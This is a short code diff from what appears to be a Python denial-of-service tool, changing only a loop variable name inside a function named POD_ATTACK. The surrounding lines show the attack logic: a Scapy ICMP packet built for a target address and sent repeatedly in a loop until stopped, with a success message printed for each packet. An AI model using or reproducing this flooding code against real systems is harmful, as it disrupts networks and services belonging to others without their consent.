@@ -25,7 +25,7 @@ def POD_ATTACK(threads, attack_time, target):
 		packet  = IP(dst = target_ip) / ICMP(id = 65535, seq = 65535) / payload
 
 		while not FINISH:
-			for i in range(16):
+			for _ in range(16):
 				send(packet, verbose = False)
 				print("\033[1;32m"+"[+]"+"\033[0m"+" Packet was sent!")
 
